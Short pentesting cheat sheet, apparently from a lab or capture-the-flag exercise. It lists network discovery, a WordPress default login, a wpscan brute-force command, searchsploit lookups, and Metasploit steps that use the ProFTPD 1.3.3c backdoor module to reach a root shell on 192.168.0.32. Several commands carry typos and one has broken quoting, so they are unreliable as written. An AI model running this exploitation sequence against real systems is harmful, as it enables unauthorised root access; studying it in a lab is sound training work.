<h2><u>finding out the network</u></h2>

`ip a`
`$netdisover -r  192.168.2.0/24 ` 


<h2><u>dafault login</u></h2>

default login for wordpress is
user: admin
pass: admin

<h2><u>wpscan</u></h2>

wpscan --url 192.168.0.32/secret --wordlist 
/usr/share/wordlists/dirb/big.txt --threads 3

<h2><u>Another FTP exploit</u></h2>
you can check for exploit in searchsploit
if the nmap scan tells you to an old version.

`searchsploit ProFTPD 1.3.3c`

another openssh exploit

`searchsploit Openssh 7.2p2`

<h3>metasploit steps</h3>
1. msfcosole
2. search ProFTPD 1.3.3c
3. use exploit/unix/ftp/proftpd_133c_backdoor
4. show options
5. set RHOST 192.168.0.32
6. exploit
>python -c 'import os; os.system('/bin/bash')'
>whoami
root


